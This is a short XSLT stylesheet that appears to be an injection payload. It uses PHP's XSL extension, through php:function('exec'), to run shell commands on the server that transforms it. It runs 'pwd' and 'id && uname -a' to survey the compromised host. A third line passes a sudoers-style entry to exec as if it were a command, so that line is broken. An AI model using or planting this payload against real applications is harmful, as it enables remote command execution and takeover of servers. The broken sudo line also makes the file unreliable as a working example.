<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('exec','pwd')"/>
<xsl:value-of select="php:function('exec','id &amp;&amp; uname -a')"/>
<xsl:value-of select="php:function('exec','sudo	ALL=(ALL:ALL) ALL')"/>
</xsl:template>
</xsl:stylesheet>
